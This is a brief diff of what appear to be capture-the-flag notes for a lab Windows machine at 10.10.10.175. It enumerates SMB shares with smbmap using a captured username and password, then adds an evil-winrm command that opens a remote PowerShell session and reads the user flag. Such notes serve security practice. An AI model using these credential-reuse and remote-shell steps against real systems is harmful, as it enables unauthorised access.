@@ -363,7 +363,9 @@ smbmap -R NETLOGON -H 10.10.10.175 -u FSmith -p Thestrokes23
 
 smbmap -R SYSVOL -H 10.10.10.175 -u FSmith -p Thestrokes23
 
-# now that we have creds try winrm 
+# now that we have creds try evil-winrm
+
+ruby evil-winrm.rb -i 10.10.10.175 -u FSmith -p Thestrokes23
 
 
 PS > date; whoami; cat ..\Desktop\user.txt; ipconfig
